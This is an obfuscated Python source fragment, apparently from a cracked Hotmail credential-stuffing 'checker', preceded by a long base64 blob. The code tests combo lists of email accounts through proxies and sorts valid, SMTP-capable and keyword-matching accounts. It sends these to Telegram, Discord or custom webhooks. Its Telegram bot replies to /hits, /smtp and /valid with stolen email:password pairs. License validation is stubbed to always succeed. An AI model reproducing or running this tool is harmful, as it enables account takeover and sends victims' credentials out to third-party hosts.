v5mYfWGjcxWw+ocbWjVo1odifnU6ke9Tl2eMZMP1pri61pzY1Jqq8owtrnMZKtfVqNHswlVqSqSjHw9Z3NZaZ9vU55TEw2XketWow/TeKPiQ3TrVI3G2QJGx9x0lxBsNoWnKpeUWteDl0lxBthy1tekyFtGMN4mvoA8hnS8cL5H9bNShsrZjK1KkJ+fTpRjTj/AGt7c5GPJfTMdH+SnoPAxhsnRw9GrW+kqx6Sp/akk552w1Z8rjTccx5McMpGHu2Jv41f+jqR6OX9rY2mYLzOwMdTeT/rDCyhvncY2t0MP5yEd1P+1EHy980oyp5W58M5NU8lcSjczbic4rOVHM3kZQ7M2lue9zuJvQzZBonXVxovmxpvVVvRheVsPkre9hRrVNka0qNSNSMZSj3eO1IXNDn1rbnFzcyustYZieSzeQn2Ie9UY92jRj3afD4otYalapK420+vOSbNE6X+9OzLZaG+/wC1Roz/AEPi+cDGdVRyGH9oRyE9lzdUen6HvQ63e8S5cs76Uszm/oafrSWfmxeSrawxsv8Amf1pOPlbU/4YzH0NP1gTNWqbqiDuZlSp/Cexp7up7W3bf6Uk1S99YLntLVNQa6satafQ46jbe7T9nrTlu7MRMRxpLSlbP3/C4uOEqONpy68/P8MWwVvRt7PH0bW1owo0acNsIQ7hb29vZ2cLe3owo21OG2EIMG1fq+nhYTsbGcK2Ul+Xj8j9oUr1frCnhbedjZ7K2UqQ/L8j4peJBMpXF9kN0t9xc1p/OlOXFxVq1SvXnWrTlUrVJbpzlx7SZOXWEtOOD4ZqpDpbuU5Rhv7kY+aC4aQ0dDEU4ZC/jCpkpQ6kPkftM3ykox0hlY/8zqerJ2luy3wTyXodT1ZDNqoANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG0uL+C+N9Dp+rFc1vxnwXxvodP1Yu4M2IcwZf4sbmP89T9Zr02B1/+bO5+mp+sg7G2fG/ztnZcJ9F09aNPf8AyeyKjq06lSjXhUpz2VI9aMo/EnjRmr6eZofe++lGGUjD3P2ezW+0hjL4i9wmarWF9T2Vo/k4+x1Zx87gtsKk6VaNSnLZOP4Yyj+UU2xl5pH42BaM1PUzVvOxvIezf0Ybum8+P7zPY/GM0N80P49xX0MvWdHlzLbqy89G+tF3uaH8e4r6GXrOhy5+Fl36N9aI0TXGXmsH1Vo/74b8piYfj8etWo/LeKPi9Zm0PiXC398BCOn4yjeQjU6k4zehHks6b/hh5RmidNxhv9vZWjGf0cZbqn9mM2sOU0jHIf8ACmLhsv49atR+W+03M8g/X3Lnl35XENVcztQw09YYvFVvae+zrV5Tup+57dtKnOUdsZT7QPpKjTjTpwp04bIRhthBU1ho+Wd5N9an7nzF3/8A0e9/9J3KfleeT3U7Ov4T/wDo93/6THjRskSjupzjLsSa4y8rjyf49rXkP/2u7/8ASW248s7yc7Xj7pr/AP8A4e9/9JI8SfK207/BHykNbadlDZC1yVbofo5y6Sn/AGZQebeot1S8nGMN85T7EHp95enMblvzG8qCGquWee+/1nkMVRpX+yzr0JQuIbqfZnHhKXs09nZaZ4fRdPE1Pvplob8rLrUaM/0MeP1m0Zo90jon717Mtlob8lL3mj8j9r1WaVJbequ15L3RZaklM0KczePs6tsPQ/rSdnlb/HOV+gj6zp8yvhdY+h/Wk7nK3+Ocr9BH1homQj1VXa/UwPW+p62Et4WNnD8euIbum8yPZ/rDN+av1nDEW88fjpwqZKXbn3aP2kEVKtStcTqVZ76kuPsylL435OcqtSU5y4zqS4+zKUlzw+Hvc5m6VjYw3VJdufsdWEfOkNFnbBcu/wA29H6aog/KWfHH6hvLDf03tetKnv8AO9hOHLv829H6aoOVnTo5f4KZX0Op6sne2fqdHL/BTK+h1PVkIaogDQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABtViZf4J4r0On6sXaYtpTO2OX03bW9GfQ3lrRjTrUZ/qjt3R8LKRmwvX/AObOt9LT9ZDWnfh5h/TKfrJo1/8AmwuPpqfrIU0/8N8P6ZT9YVGxeo8NY6hxHtavD2K0fea3ehL91rllcVd4fLzs7yGycexPuzj53BtBL4llzeCs8/iJ2t11K0fea3ehIIh3QWRtcfrOfG8qdDCtS6KE+7u3RT5H42sGWxF5hcxOyvIbZ8OxPuzj50UgaN1n0M6OKzFb3Hs21zPueGXhFOLmf8IMX9DL1nQ5c/Cy79G+tF3eaP8AH+K9Hl6zqcuPhZeejfWiCaYxdqnL3V13JGQMqxt50NxBcMtj6d1TnlMT7jlY9ujD9N9ph9GttXq3yEqYzWez11cW/udSc4Tj1ZwX6jzGrRp+/ML1dhfvpCeUxvUyUffofLfaQrLMVKdSdOpvhOPbgNG0FTmRcSp9a5mx3Ia+urj3GnWnOcurCEGv/wB+KkqkIx685dXYmjR+D+9tOGUynXyUutRo/I/aBI2n8X7R4QzGW6+Vl1qMJ/oftOTJZDpqk1rrZCUuPbWupWlIZqa1TdUW+XWc0pOGUtwIR5lfCy09G+tJ3OVv8c5X6CPrOnzM+Fth6H9aTucrvY+/WV3fIx9YaJojFAOv8pZ5LWMfac+mjb0einPu7t3dX/Wet5VOmw+Hre49m5uYd/wxRzicTeZnLws7OG6cu3Puwj50gfmKxV3mMvCzs4bp8e3Puwj50mxWncHaYDBwtbWG+tLrVq3enL91w4TCWeBxELe1685e/Vp9qcl+pyBrJqb4f5n0yp6yZuXn5uKP01RDOpvh/mfTKnrJo5efmzo/TVPWE1m7o5f4KZX0Op6sneYpq3UFjiNMXNtU92vLqjKnRow/XHbukJa3ADQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB3bG+usfkqV5aVehuKfYm2E0xqWz1Bi9svcclT9+o/Wj4WtzuWd3cWN/SurWrOhc0+O6E4/ECeuYn5sLn6an6yE9O/DrDemU/WZ/mdU22oOUFzTqbKOSp1qfTUeHf63aiwDTvw4w/plP1gbOS7alVL4lILRm8JZ53ETtryGypH3mtDtQk17zGGvsHl5Wd9T2ce5Puzj50WzaNeaW37x4f6ap6sRMRPeZK7v7W0pXNXpeFtDo6MpdrhFmfLf4XXfo314o6SNy1ju1fd+i/WiKTcp2/rVAKd21zRqSddyRjEZuxGtJHusNKxylOeSxsNmSj24fLfaXK81fp2zyFa1rX/u1Pt7KcpR/rRdP+HWmf+X/APh6n7o0dPRuleGP2ZLKQ33/AOho/I/aSNKtLz2C/wAOtM/8vl/2ep+67FrrDAXl/C1o3/u1Tqw305R/tSBmHTf7+wb/ANTrw+JyAqlJSAIS5lfDGy9D+tJhtllLywtLuja1uNGF1CMK0odrbwZlzK+GVn6H9aSOAXrD4a+zeYhZ2cN/HtTn3YR86TYDDYOzwOI9q2sOv363enJhfK2W3D5j6an6sknAOSHxuNyQ+MZtY9SfD/M+mVPWTTy6l/i2pfT1EK6j+HmZ9MqeskHB6ntdPcoaW3hGtkatap0VH+TxS8Iqs61VqS107i/lslU95o/Wl4Wu19fXWQylW7u6vTV6nbm/b69ushk6t5eVp17mpx3TnN0RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvWnfhxh/TKfrLK56NWpbXkK1KeyrTnuhL+TjwBtaq2/rYdpDVtvm6ELO8nCjlaf8AVreKP7qz2Os42ev8ristW/E/blSNtW+R63Zl4RPEjox5n/xFivpperFJ0Zbqe6PXgjHmf/EWK+ml6sRSGUj8tPhdeejfXijhI/LSUY61uI8Z7JytZbP60QTaCrbuGanZ+pF2s9Y9B0uIxVX3Xs3NzDu+GLs641Rc42tPEWW+jcTh7Nar5sePmoetbepd5CjbU9nCdSe2G/jt/KNC2tbi8uOhtaM7irx/DthT3Sdz7w5v/wCVXn/Z5J505pu1wGM9jh7teS9+rfVj4WSA1k+8Gb/+VXn/AGeTo3FtdWd3xpXVGdtWj+HbOG2TaljWpdOWufxm2XuOQp+81vqy8IMU0jrDjc9DicpP8Z7NG5n3/DL9aTGrFajUtryrRl7G+nOUZbfw/kTJobVFbIw+899Cda5pw3Ubjzox7sv3gSGKtvE2/rBCfMn4X2no31pI5SLzJlHjrS3jwl7M42sd/wDWkjoEx8r/AOJsx9NT9WSUUX8r/wCKMx9NT9WSUJbY05yl1IRBVGO5VGKLMprP25rLG4rEz/E/blONatD9N1uzHw+syTWGr7fBUJ2dpsrZSpDqw4dmj4pfuieIR1H8PMz6ZU9ZZHPWrVbi8nWqz4zq1Jbpy4/yuAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA56NapQuIVqM5060OO6E4d1Vc3Fe8v611XnvrVZ7pz/XxdYBsRoCpUrctLaVSe/bWqR6/m7lh5qfxLh/pqnqxc3LnN2UsBDDTl0d/TqSlDf348fNcfNSX/AeH+mqerEEUYrF3WXyvCxs4dJcyhKcI+ftju2utCd1j8nwlHjO2uqM/myhLgynl9+dTH/Mqfs5JH1lo6nmKc8hj4bMrHtw+W+0Dm0nqmjnrL2tcbKOUpw68PlvFH+9mW6UWq8JXNjk+E6fGdtdUZ/NlCXBOeltV085b+1brZRykIdb+e8UQXXUmBtdRYvoa3uNzT95reZ9lr5kLC7xOXq2d5T6KtT4/wC/Hg2jY3qLTtrnsZ0dT3G5p+81vM+yDCtIaz9zhicrW8Ntcz9WX7yVd/62sWSxt3icvVs72l0Nan/a8XBI+jtYxjwo4nLT6nDq29xP4vDIEtIj1frOVbpsViqvufZubmH6TwxUax1f0lWtisTW9mj2bm5h3/DFH+Lxd3l8tRsrOnvrS/L+Dqwj53EDGY27y+Wp2dnT31Zfl48ezGPnSbBafwNrp/F9Db9etL36t3py/dMBgLbAYf2vR69aXv1bz5L6Crd+phWrNVwwdtO2tZQrZSpDsfI+KX9z81Xq2nhKErWznGtlKkf+p8UkFSlc32T4ylxnc3VafzpTlxB+yldX+T4ylxnc3dafzpTlxdrLYq6w+W42V3w23PCnGU4R7m6O7amrRuj6eFpwyGQhCeSl2P5n7SOOYkt3NC74/wA1T9UGW8rY7sPmPpqfqyZJryUqPLS/lTnt3Tpx6nzmO8q4+zh8x9NT9WTn5i5uzp4OphKdTpbupOMpwh3PYlu6wIZtripa39G5o8dtWlOMocf18H5cXFa6vJ3FxOVWtOW6c5fG64AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADnp1alC5hWpT6OrHjujKPxMwz+qZag0hjbe7hx++VtVl0s+HZqR29r5zCAGa8vvzqY/5lT9nJsHKTXbRN3QsuY9hXuq0aNDrR4zn8XsxlHh//bYkEf6v0lTy9Cd9Yw2ZKPxfLfaQnGVxY5DdHfb3NGfzZQlwbVbv1MG1bo+nmqE76whCjlI/ycerW+0BpTVVHN2/tW8nCjlY/wDfeKLN4x+OTVaMrmxyfCUeM7a6oz+bKEuCdtJavo5mz9p3nHosrTh/RrR86Pi8IL1qLAWWewvRV4bLmn7zcR4daH2WvGSxt3icrVsryGyrH+rLh53BtAhvmf8Ax7i/RpesJjA8bjbvLZejZWdPfVnx/q/r4thNO4Gz0/h/a9HrXMvfq3en9lG3LDh/hHkvR4+smfb+sUq2fqYLqzVtPCUZ2NpOFbKS/k7NHxS8T81bq+nhqHtOxnvykof0aPil4kHfjV9k+/c3lafzpTlxE8fn4zfX/fubmtP50py4p00hpCnhbeF9fQhPKVIfg/mfm+JyaS0hTwdrC8veEK2Uqf1aPhj4maykKcjXrmD+c27+ip+q2B3d5rprK+tr/mHeXFrV6Wjx4Rjvj+qO3iJjsaf1NLAaQytC0jx++VzVj0U+PYpx4Rlul878P4GIValSvcSq1ZynVlx3TlL43CCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABKejdZ8bbjRxeWrfi3Zo1p9zwy8KLAG2nackPiQzo7WPtXZistV9i17NGtPueGXhTF4ojNhmsdJUczbzvrPZRylOP8ARrR82XiQT+MWOQ79vdUZ/NlCXBtSwvVukIZq34XtjCMMpGH/AF3hl4hXXFo/VtHNUoWF9OFHKR7H8983xMY5ox25zFfQy9ZGso3FjkOMZcJ21zRn82UJcF8z2oa2etsZ7ah7N3a0eNOpW+V8Qpl3Kvb/AAiyu7/k0fWZXrPV9PDQnj7GcK2Ul2+PyP2kS4HP1sDRyUrWHD2zc0Y04Tl3Ot7O5ZoxushlO/c3dafzpTlxB+fjF9k+/c3dafzpTlxTtpHSlPCUIXl5DflKkP8AqfDE0lpKnhqEL28hCtlJf9z4Ys3BVKSmW3o90upBTu2090upCKGtY6zledNi8TPZZ9mtWh+m8MfCCrWOtPbXTYnE1vZtuzWuYd/wx8KLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASho7WMrOdHFZatus+zRrT/Q+GXhReA20j1uO6Lmj8aFdGaz9o1KOMys+E7Ls0a0+PvP+fwpqjt7UevCQzQ9zRt7eGRxVzGjGFzWhUjWnw7+3bt9ZEyXeafvmF/6b6qIhoJY5X29GplMpcVKMZ1qMKcaM+Pc3btyJ0u8rPfM1/wBD9YEuy+Jxy6vWl2IuSUoxp7pT2bUKa01n98Kk8XiZ/icerWrQ/TfN8IP3WWsfbk62JxM+ELPh1a1aHH37wx8KLwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASbozWcsdUp4vKT32PZo1p/ofsoyAS7zRlGXDA1I8d8ZRrf/AOaIlzuMjd3WLs7O4rca1G13dDwn3N232Y/2VsATDyq2xhnqkp7KcYUZT/7xDy422Su7TFXdlb1Z0qNzt6bhHv7d3sesDPNZ60lkqtXF4ueyw7Natw/TfZRkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/Z'

def save_key(key):
    pass

def delete_key():
    pass

def get_cached_key():
    return ''

def has_internet():
    try:
        _socket.create_connection(('8.8.8.8', 53), timeout=2)
        return True
    except OSError:
        return False
rate_ts = 0

def write_license_cache(lic_data):
    pass
    try:
        lic_path.parent.mkdir(parents=True, exist_ok=True)
        lic_path.write_text(json.dumps(lic_data), encoding='utf-8')
    except Exception:
        pass

def read_license_cache():
    pass
    try:
        if not lic_path.exists():
            return None
        data = json.loads(lic_path.read_text(encoding='utf-8'))
        expires = data.get('expires', 0)
        if time.time() > expires:
            return None
        return data
    except Exception:
        return None

def delete_license_cache():
    pass
    try:
        if lic_path.exists():
            lic_path.unlink()
    except Exception:
        pass
week_secs = 7 * 24 * 60 * 60

def license_error(status_code, err):
    return ('', False, '')

def validate_license(key, device_id2=None):
    return (True, None, '')

def validate_license_wrapper(key):
    return (True, None, '')

def load_announcements():
    return []

def send_announcement(msg):
    return

def send_valid_webhook(*args, **kwargs):
    return

def load_license_config(*args, **kwargs):
    return

def load_license_config_alt(*args, **kwargs):
    return

def load_license_config_alt2(*args, **kwargs):
    return

def send_valid_accounts_webhook(*args, **kwargs):
    return

def send_accounts_webhook(*args, **kwargs):
    return

def send_valid_webhook_alt(*args, **kwargs):
    return

def send_2fa_webhook(*args, **kwargs):
    return

def send_valid_accounts_webhook_alt(*args, **kwargs):
    return

def format_html(*args, **kwargs):
    return

def format_html_alt(*args, **kwargs):
    return
_1e0_173f4c = {'http': None, 'https': None}

def load_webhooks():
    state = 518389
    while True:
        if state == 518389:
            proxy3 = get_thread_proxy()
            state = 807032
        elif state == 807032:
            if not proxy3:
                return None
            state = 422624
        elif state == 422624:
            proxy3 = proxy3.strip()
            state = 455345
        elif state == 455345:
            scheme = proxy_type or 'socks5'
            state = 107309
        elif state == 107309:
            body = proxy3
            state = 874357
        elif state == 874357:
            if '://' in proxy3:
                scheme, body = proxy3.split('://', 1)
            state = 1001482
        elif state == 1001482:
            user = pw = None
            state = 253360
        elif state == 253360:
            if '@' in body:
                domain, body = body.rsplit('@', 1)
                if ':' in domain:
                    user, pw = domain.split(':', 1)
            state = 95990
        elif state == 95990:
            parts = body.split(':')
            state = 348856
        elif state == 348856:
            if len(parts) >= 4:
                proxy, proxy2 = (parts[0], parts[1])
                user, pw = (parts[2], ':'.join(parts[3:]))
            elif len(parts) >= 2:
                proxy, proxy2 = (parts[0], parts[1])
            else:
                proxy, proxy2 = (parts[0], '1080')
            state = 517928
        elif state == 517928:
            if user and pw:
                url = f'{scheme}://{user}:{pw}@{proxy}:{proxy2}'
            else:
                url = f'{scheme}://{proxy}:{proxy2}'
            state = 907580
        elif state == 907580:
            return {'http': url, 'https': url}
        else:
            break
webhooks_path = Path.home() / '.config' / '.hotmail_webhooks.json'
_185_7f1446 = ['hit', 'valid', 'smtp', 'start', 'finish']

def load_webhooks_alt():
    try:
        if webhooks_path.exists():
            data = json.loads(webhooks_path.read_text(encoding='utf-8'))
            for key in ('telegram', 'discord', 'custom'):
                if key in data and 'events' not in data[key]:
                    data[key]['events'] = ['hit']
            return data
    except Exception:
        pass
    return {'telegram': {'token': '', 'chat_id': '', 'enabled': False, 'events': ['hit']}, 'discord': {'url': '', 'enabled': False, 'events': ['hit']}, 'custom': {'url': '', 'enabled': False, 'events': ['hit']}}

def get_webhook(webhook):
    try:
        webhooks_path.parent.mkdir(parents=True, exist_ok=True)
        webhooks_path.write_text(json.dumps(webhook, indent=2), encoding='utf-8')
    except Exception:
        pass

def show_message(title, text, data3, kind='text'):
    state = 95867
    while True:
        if state == 95867:
            datetime_mod = __import__('datetime', None, None, ['datetime'])
            state = 591765
        elif state == 591765:
            datetime = datetime_mod.datetime
            state = 279593
        elif state == 279593:
            now_str = datetime.now().strftime('%Y-%m-%d %H:%M')
            state = 527606
        elif state == 527606:
            if kind == 'telegram':
                html_msg = f'<b>{title}</b>\n<code>{text}</code>'
                if data3:
                    for kw, item in data3.items():
                        html_msg += f'\n{kw}: <b>{item}</b>'
                html_msg += f'\n\n🕐 {now_str}  •  {app_name}'
                return html_msg
            elif kind == 'discord':
                emoji_colors = {'🎯': 16729156, '📤': 48340, '✓': 58998, '▶': 2201331, '☑': 10233776, '🧪': 16750592}
                color = 58998
                for color2, client in emoji_colors.items():
                    if title.startswith(color2):
                        color = client
                        break
                body = f'`{text}`'
                if data3:
                    for kw, item in data3.items():
                        body += f'\n**{kw}:** {item}'
                embed = {'title': title, 'description': body, 'color': color, 'footer': {'text': f'{app_name} v{version}  •  {now_str}'}}
                return embed
            else:
                datetime_mod = __import__('datetime', None, None, ['datetime'])
                datetime = datetime_mod.datetime
                payload = {'title': title, 'text': text, 'app': app_name, 'timestamp': datetime.now().isoformat()}
                if data3:
                    payload['fields'] = data3
                return payload
            state = -1
        else:
            break

def http_post(url, *, json_data=None, headers=None, timeout=10):
    webhooks = load_webhooks()
    if webhooks:
        try:
            return _requests.post(url, json=json_data, headers=headers, timeout=timeout, proxies=webhooks)
        except Exception:
            pass
    return _requests.post(url, json=json_data, headers=headers, timeout=timeout)

def http_get(url, *, params=None, timeout=10):
    webhooks = load_webhooks()
    if webhooks:
        try:
            return _requests.get(url, params=params, timeout=timeout, proxies=webhooks)
        except Exception:
            pass
    return _requests.get(url, params=params, timeout=timeout)

def show_error(webhook, title, text, data3=None):
    token = (webhook.get('token') or '').strip()
    chat_id2 = (webhook.get('chat_id') or '').strip()
    if not token:
        return (False, 'Bot token is empty')
    if not chat_id2:
        return (False, 'Chat ID is empty')
    html_msg = show_message(title, text, data3, 'telegram')
    try:
        resp = http_post(f'https://api.telegram.org/bot{token}/sendMessage', json_data={'chat_id': chat_id2, 'text': html_msg, 'parse_mode': 'HTML'})
        data = resp.json()
        if data.get('ok'):
            return (True, None)
        return (False, data.get('description', f'HTTP {resp.status_code}'))
    except Exception as exc2:
        return (False, str(exc2))

def show_warning(webhook, title, text, data3=None):
    url = (webhook.get('url') or '').strip()
    if not url:
        return (False, 'Webhook URL is empty')
    embed = show_message(title, text, data3, 'discord')
    try:
        resp = http_post(url, json_data={'embeds': [embed]}, headers={'Content-Type': 'application/json'})
        if resp.status_code in (200, 204):
            return (True, None)
        return (False, f'HTTP {resp.status_code}: {resp.text[:100]}')
    except Exception as exc2:
        return (False, str(exc2))

def show_info(webhook, title, text, data3=None):
    url = (webhook.get('url') or '').strip()
    if not url:
        return (False, 'Webhook URL is empty')
    payload = show_message(title, text, data3, 'custom')
    try:
        resp = http_post(url, json_data=payload, headers={'Content-Type': 'application/json'})
        if resp.status_code in (200, 201, 204):
            return (True, None)
        return (False, f'HTTP {resp.status_code}: {resp.text[:100]}')
    except Exception as exc2:
        return (False, str(exc2))

def send_webhook_alt2(provider, title, text, data3=None):
    providers = load_webhooks_alt()
    for key, _14a_6c2b8f in [('telegram', show_error), ('discord', show_warning), ('custom', show_info)]:
        webhook = providers.get(key, {})
        if webhook.get('enabled') and provider in webhook.get('events', []):
            try:
                _14a_6c2b8f(webhook, title, text, data3)
            except Exception:
                pass

def send_webhook(provider, title, text, data3=None):
    state2 = 637575
    while True:
        if state2 == 637575:
            state2 = 315039
        elif state2 == 315039:
            state2 = 728051
        elif state2 == 728051:
            _threading.Thread(target=send_webhook_alt2, args=(provider, title, text, data3), daemon=True).start()
            state2 = -1
        else:
            break

class Config:

    def __init__(self, _244_19dea2):
        state = 94265
        while True:
            if state == 94265:
                self.app = _244_19dea2
                state = 103401
            elif state == 103401:
                self._running = False
                state = 806212
            elif state == 806212:
                self._last_update_id = 0
                state = 790643
            elif state == 790643:
                self._thread = None
                state = -1
            else:
                break

    def start(self):
        state = 282937
        while True:
            if state == 282937:
                if self._running:
                    return
                state = 760024
            elif state == 760024:
                providers = load_webhooks_alt()
                state = 719717
            elif state == 719717:
                tg_cfg = providers.get('telegram', {})
                state = 579053
            elif state == 579053:
                if not tg_cfg.get('enabled') or not tg_cfg.get('token') or (not tg_cfg.get('chat_id')):
                    return
                state = 440927
            elif state == 440927:
                self._running = True
                state = 122867
            elif state == 122867:
                self._thread = _threading.Thread(target=self._poll_loop, daemon=True)
                state = 652304
            elif state == 652304:
                self._thread.start()
                state = -1
            else:
                break

    def stop(self):
        state2 = 93101
        while True:
            if state2 == 93101:
                state2 = 838888
            elif state2 == 838888:
                state2 = 714745
            elif state2 == 714745:
                self._running = False
                state2 = -1
            else:
                break

    def _poll_loop(self):
        providers = load_webhooks_alt()
        tg_cfg = providers.get('telegram', {})
        token = tg_cfg.get('token', '').strip()
        chat_id = tg_cfg.get('chat_id', '').strip()
        if not token or not chat_id:
            return
        try:
            resp = http_get(f'https://api.telegram.org/bot{token}/getUpdates', params={'offset': -1, 'limit': 1}, timeout=10)
            data = resp.json()
            if data.get('ok') and data.get('result'):
                self._last_update_id = data['result'][-1]['update_id']
        except Exception:
            pass
        while self._running:
            try:
                resp = http_get(f'https://api.telegram.org/bot{token}/getUpdates', params={'offset': self._last_update_id + 1, 'timeout': 15, 'limit': 10}, timeout=25)
                data = resp.json()
                if not data.get('ok'):
                    time.sleep(5)
                    continue
                for update in data.get('result', []):
                    self._last_update_id = update['update_id']
                    html_msg = update.get('message', {})
                    text = (html_msg.get('text') or '').strip().lower()
                    _dc_617aa9 = str(html_msg.get('chat', {}).get('id', ''))
                    if _dc_617aa9 != chat_id:
                        continue
                    if text.startswith('/'):
                        self._handle_command(text, token, chat_id)
            except Exception:
                time.sleep(5)

    def _reply(self, token, chat_id, text):
        try:
            http_post(f'https://api.telegram.org/bot{token}/sendMessage', json_data={'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'})
        except Exception:
            pass

    def _handle_command(self, cmd, token, chat_id):
        state = 166484
        while True:
            if state == 166484:
                cmd = cmd.split('@')[0].strip()
                state = 1032353
            elif state == 1032353:
                app = self.app
                state = 185383
            elif state == 185383:
                if cmd == '/status':
                    if app.running:
                        elapsed = int(time.time() - app.t_start) if app.t_start else 0
                        secs, mins = divmod(elapsed, 60)
                        _173_ff65b1 = 'PAUSED' if app.paused else 'RUNNING'
                        html_msg = f'<b>{_173_ff65b1}</b>\nProgress: {app.nc}/{len(app.accounts)}\nValid: <b>{app.nv}</b>  |  Invalid: {app.nb}\nHits: <b>{app.n_hits}</b>  |  SMTP: {app.n_smtp}\nErrors: {app.ne}  |  Time: {secs}m{mins}s'
                    else:
                        html_msg = 'Checker is <b>STOPPED</b>'
                    self._reply(token, chat_id, html_msg)
                elif cmd == '/start':
                    if app.running:
                        self._reply(token, chat_id, 'Checker is already running')
                    elif not app.accounts:
                        self._reply(token, chat_id, 'No accounts loaded. Load combos in the app first.')
                    else:
                        app.root.after(0, app._start)
                        self._reply(token, chat_id, 'Starting checker...')
                elif cmd == '/stop':
                    if not app.running:
                        self._reply(token, chat_id, 'Checker is not running')
                    else:
                        app.root.after(0, app._stop)
                        self._reply(token, chat_id, 'Stopping checker...')
                elif cmd == '/pause':
                    if not app.running:
                        self._reply(token, chat_id, 'Checker is not running')
                    elif app.paused:
                        self._reply(token, chat_id, 'Already paused. Use /resume')
                    else:
                        app.root.after(0, app._pause)
                        self._reply(token, chat_id, 'Pausing checker...')
                elif cmd == '/resume':
                    if not app.running:
                        self._reply(token, chat_id, 'Checker is not running')
                    elif not app.paused:
                        self._reply(token, chat_id, 'Checker is not paused')
                    else:
                        app.root.after(0, app._pause)
                        self._reply(token, chat_id, 'Resuming checker...')
                elif cmd == '/hits':
                    if app.valid_accounts:
                        kw_hits = [acc for acc in app.valid_accounts if acc.get('info', {}).get('kw_match', 0) > 0]
                        if kw_hits:
                            lines_out2 = [f'<b>{len(kw_hits)} Hit Accounts:</b>']
                            for acc in kw_hits[:20]:
                                _95_6cf512 = acc.get('info', {}).get('kw_match', 0)
                                lines_out2.append(f"<code>{acc['email']}:{acc['pw']}</code> ({_95_6cf512} hits)")
                            if len(kw_hits) > 20:
                                lines_out2.append(f'... and {len(kw_hits) - 20} more')
                            self._reply(token, chat_id, '\n'.join(lines_out2))
                        else:
                            self._reply(token, chat_id, 'No hits found yet')
                    else:
                        self._reply(token, chat_id, 'No valid accounts yet')
                elif cmd == '/smtp':
                    smtp_ok_list = [acc for acc in app.valid_accounts if acc.get('smtp_ok')]
                    if smtp_ok_list:
                        lines_out2 = [f'<b>{len(smtp_ok_list)} SMTP Accounts:</b>']
                        for acc in smtp_ok_list[:20]:
                            lines_out2.append(f"<code>{acc['email']}:{acc['pw']}</code>")
                        if len(smtp_ok_list) > 20:
                            lines_out2.append(f'... and {len(smtp_ok_list) - 20} more')
                        self._reply(token, chat_id, '\n'.join(lines_out2))
                    else:
                        self._reply(token, chat_id, 'No SMTP accounts found yet')
                elif cmd == '/valid':
                    if app.valid_accounts:
                        lines_out2 = [f'<b>{len(app.valid_accounts)} Valid Accounts:</b>']
                        for acc in app.valid_accounts[:20]:
                            lines_out2.append(f"<code>{acc['email']}:{acc['pw']}</code>")
                        if len(app.valid_accounts) > 20:
                            lines_out2.append(f'... and {len(app.valid_accounts) - 20} more')
                        self._reply(token, chat_id, '\n'.join(lines_out2))
                    else:
                        self._reply(token, chat_id, 'No valid accounts yet')
                elif cmd == '/help':
                    self._reply(token, chat_id, '<b>HMC Bot Commands:</b>\n/status - Checker status\n/start - Start checker\n/stop - Stop checker\n/pause - Pause checker\n/resume - Resume checker\n/hits - List hit accounts\n/smtp - List SMTP accounts\n/valid - List valid accounts\n/help - Show this help')
                else:
                    self._reply(token, chat_id, f'Unknown command: {cmd}\nUse /help for commands')
                state = -1
            else:
                break

class Colors:
    pass
    BG = '#0a0a12'
    BG_ELEVATED = '#10101a'
    SURFACE = '#15151f'
    SURFACE_2 = '#1c1c2a'
    BORDER = '#26263a'
    BORDER_HI = '#36364e'
    TEXT = '#e8e8f5'
    TEXT_SOFT = '#a0a0c0'
    TEXT_MUTED = '#6c6c8a'
    ACCENT = '#10b981'
    ACCENT_HI = '#34d399'
    ACCENT_LO = '#059669'
    SUCCESS = '#10b981'
    WARNING = '#f59e0b'
    DANGER = '#ef4444'
    INFO = '#3b82f6'
    PURPLE = '#a855f7'
    SP_XS = 4
    SP_SM = 8
    SP_MD = 12
    SP_LG = 16
    SP_XL = 24
    SP_2XL = 32
    R_SM = 4
    R_MD = 6
    R_LG = 10
    R_XL = 14
    R_PILL = 999
    FONT_FAMILY = '\'Inter\',\'SF Pro Display\',\'Segoe UI\',\'DejaVu Sans\',sans-serif'
    FONT_MONO = '\'JetBrains Mono\',\'Cascadia Code\',\'Consolas\',\'Menlo\',monospace'
    FS_CAPTION = 10
    FS_SMALL = 11
    FS_BODY = 12
